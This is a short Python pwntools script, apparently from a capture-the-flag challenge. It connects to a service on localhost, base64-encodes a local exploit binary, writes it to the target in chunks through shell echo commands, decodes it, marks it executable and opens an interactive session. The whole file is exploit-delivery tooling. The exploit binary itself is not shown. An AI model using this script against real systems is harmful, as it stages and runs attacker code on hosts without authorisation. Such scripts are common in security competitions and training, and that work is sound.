from pwn import *
import os
#context.log_level = 'debug'
r = remote('127.0.0.1', 10008)
#r = remote('172.17.0.3', 1337)

def exec_cmd(cmd):
    r.recvuntil("$ ")
    r.sendline(cmd)

def upload():
    p = log.progress("Upload")

    with open("./exp", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data).replace(b'\n',b'').decode()

    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /home/user/benc" % (encoded[i:i+500]))
        
    exec_cmd("cat /home/user/benc | base64 -d > /home/user/bout")    
    exec_cmd("chmod +x /home/user/bout")

    p.success()

#r.send(os.popen(r.recvline().strip()).read().split(b': ')[0])
exec_cmd('cd ~')
upload()
r.interactive()
